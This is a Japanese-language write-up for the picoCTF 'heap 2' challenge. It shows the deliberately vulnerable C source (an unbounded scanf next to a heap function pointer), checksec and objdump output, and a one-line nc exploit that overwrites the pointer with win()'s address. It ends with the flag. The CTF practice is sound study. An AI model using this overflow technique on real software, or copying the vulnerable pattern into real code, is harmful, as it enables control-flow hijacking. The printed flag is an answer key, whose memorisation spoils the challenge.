# heap 2:Binary Exploitation:200pts
Can you handle function pointers?  
Download the binary [here](chall).  
Download the source [here](chall.c).  
Connect with the challenge instance here:  
`nc mimas.picoctf.net 53382`  

Hints  
1  
Are you doing the right endianness?  

# Solution
バイナリ、ソースと接続先が渡される。  
ソースを見ると以下の通りであった。  
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }

void print_menu() {
    printf("\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {

    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x, x);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```
[heap 0](../heap_0)と[heap 1](../heap_1)とほぼ変わらないようだが、Print Flagで`check_win`が呼ばれており、`x`を呼び出している。  
`x`は文字列`bico`で初期化されており、オーバーフローで`win`を設定する必要がありそうだ。  
```bash
$ checksec --file=./chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   51 Symbols        No    0               2               ./chall
$ objdump -D ./chall | grep '<win>'
objdump: Warning: Unrecognized form: 0x22
objdump: Warning: Unrecognized form: 0x22
objdump: Warning: Unrecognized form: 0x23
00000000004011a0 <win>:
```
PIEが無効で、`win`のアドレスが`0x4011a0`とわかるのでそこに飛ばせばよい。  
以下のようにオーバーフローを調整して`win`に飛ばす。  
```bash
$ echo -e '2\nSATOKISATOKISATOKISATOKISATOKISA\xa0\x11\x40\x00\n4' | nc mimas.picoctf.net 53382

I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: Data for buffer:
1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: picoCTF{and_down_the_road_we_go_ba77314d}
```
Write to bufferで`x`を書き換え、Print Flagでflagが表示された。  

## picoCTF{and_down_the_road_we_go_ba77314d}